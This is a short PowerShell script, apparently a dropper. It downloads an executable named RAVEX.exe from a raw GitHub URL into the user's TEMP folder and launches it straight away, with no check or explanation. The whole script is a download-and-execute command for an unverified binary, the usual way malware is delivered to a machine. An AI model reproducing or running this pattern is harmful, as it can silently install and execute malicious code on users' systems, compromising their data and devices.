$url = "https://raw.githubusercontent.com/kittipatseepakdee-eng/SKYNET/refs/heads/main/RAVEX.exe"
$file = "$env:TEMP\RAVEX.exe"

Invoke-WebRequest $url -OutFile $file
Start-Process $file
